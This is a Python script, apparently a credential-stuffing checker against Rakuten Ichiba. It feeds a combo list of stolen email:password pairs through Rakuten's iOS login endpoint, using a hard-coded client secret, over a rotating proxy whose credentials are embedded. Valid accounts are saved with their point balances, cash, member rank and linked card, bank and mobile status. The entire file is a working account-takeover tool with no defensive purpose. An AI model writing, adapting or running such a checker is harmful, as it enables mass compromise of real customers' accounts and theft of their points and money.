import requests
from concurrent.futures.thread import ThreadPoolExecutor

proxies = {
    "https": "http://1a79416a979e9d8a7972__cr.jp:a7653d2e05972cc1@gw.dataimpulse.com:823"
}



RANK = {
    1: "レギュラー会員",
    2: "シルバー会員",
    3: "ゴールド会員",
    4: "プラチナ会員",
    5: "ダイヤモンド会員",
}



def rakuten_login(email,password):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        'Accept-Language': 'ja-JP;q=1',
        'Accept': 'application/json',
        'Connection': 'keep-alive',
        'Host': 'ios-api.app.rakuten.co.jp',
        'User-Agent': '%E6%A5%BD%E5%A4%A9%E5%B8%82%E5%A0%B4/112010 CFNetwork/1410.0.3 Darwin/22.6.0',
    }
    data = {
        'client_id': 'ichiba_iphone_long',
        'client_secret': '5CB7wXoed1hRNrUP332QFnTbZOD3YQv2rU1jEVEsY4nj',
        'grant_type': 'password',
        'scope': 'Promotion@Refresh,discovery,gnrsrch,gnrtop,ichiba_benefitscalculation,ichiba_roomfeed,ichiba_searchdynamic,ichiba_shipping,ichibashop_basket,ichibashop_item,ichibashop_item_ranking,ichibashop_maintenance,itemRcm,notifier,pnp_ios_denytype_check,pnp_ios_denytype_update,pnp_ios_register,pnp_ios_unregister,product_search,review_read,rfCrt,screen_api,shop_top,shorturl_update,shptp_preview,ichiba_memberinfo_read',
        'password': password,
        'username': email
    }



    response = requests.post('https://ios-api.app.rakuten.co.jp/engine/token', headers=headers, data=data, proxies=proxies, timeout=6)
    if response.status_code==200:
        return response.json()['access_token']
    else:
        if response.json()['error_description'] != "username/password is wrong":
            print("Error:"+response.json()['error_description'])
            raise Exception
        return False



def get_point(token):
    headers = {
        'X-ClientId': 'ichiba_iphone_long',
        'Host': 'api-ichiba-gateway.rakuten.co.jp',
        'Authorization': f'OAuth2 {token}',
        'User-Agent': 'IchibaApp-jp.co.rakuten.ichiba/11.2.0',
        'Accept': '*/*',
        'Accept-Language': 'ja',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
    }



    json_data = {
        'common': {
            'include': [
                'memberPointInfo',
            ],
            'params': {},
        },
        'features': {},
    }

    response = requests.post(
        'https://api-ichiba-gateway.rakuten.co.jp/mobile-bff/memberpointinfo/get/v3',
        headers=headers,
        json=json_data,
    )



    try:
        point1 = response.json()['body']['memberPointInfo']['data']['pointInfo']['limitedPoint']
        point2 = response.json()['body']['memberPointInfo']['data']['pointInfo']['fixedPoint']
        point3 = response.json()['body']['memberPointInfo']['data']['pointInfo']['futurePoint']
        point4 = response.json()['body']['memberPointInfo']['data']['pointInfo']['temporaryPoint']
        point5 = response.json()['body']['memberPointInfo']['data']['pointInfo']['cash']
    except:
        return False
    all_points = int(point1) + int(point2) + int(point4) + int(point5)

    json_data = {
        'common': {
            'include': [
                'benefitsStatusInfo',
            ],
            'params': {
                'deviceType': 'mobile',
                'templateName': 'sp_app_ios',
            },
        }
    }



    otherStatus = ""
    
    for _ in range(5):
        try:
            response = requests.post(
                'https://api-ichiba-gateway.rakuten.co.jp/mobile-bff/homescreen/get/v5',
                headers=headers,
                json=json_data
            )
            ichiba_account_info = response.json()["body"]["benefitsStatusInfo"]["data"]
            break
        except:
            None
    try:
        member_rank = RANK[ichiba_account_info["userRank"]]
    except:
        return False
    for i in ichiba_account_info["displaySections"][0]["campaigns"]:
        if i["qualified"] and i["spuxCampaignId"] in ["rakutenMobile","rakutenCard","rakutenBank"]:
            otherStatus += f'|{i["spuxCampaignId"]}'

    return {'all_points':all_points, 'future_points':point3, "otherStatus":otherStatus, "cash":point5, "useable_points":point2, "member_rank":member_rank}

def thread_data(lines):
    with ThreadPoolExecutor(max_workers=27, thread_name_prefix="thread") as executor:
        for i in lines:
            executor.submit(process_credentials,(i))

def process_credentials(lines):
        lines = lines.split("|")[0].replace("\n","")
        parts = lines.split(":")
        try:
            email = parts[0]
            password = parts[1]
        except IndexError:
            print('Error')
            return
        while True:
            try:
                login_result = rakuten_login(email, password)
                break
            except Exception as e:
                import time
                print("error")
                time.sleep(5)
        if login_result:
            points = get_point(login_result)
            if not points:
                print(f'Die {email}:{password}\n',end="")
            else:
                print(f'Hit {email}:{password}|{points["member_rank"]}|Points:{points["useable_points"]}P|Cash:{points["cash"]}{points["otherStatus"]}\n',end="")
                with open("rakuten_hit.txt","a",encoding="utf-8")as f:
                    f.write(f'\n{email}:{password}|{points["member_rank"]}|Points:{points["useable_points"]}P|Cash:{points["cash"]}{points["otherStatus"]}')
            
        else:
            print(f'Die {email}:{password}')

if __name__ == "__main__":
    with open(r"コンボ.txt", 'r', encoding='utf-8') as file:
        lines = file.readlines()

    thread_data(lines)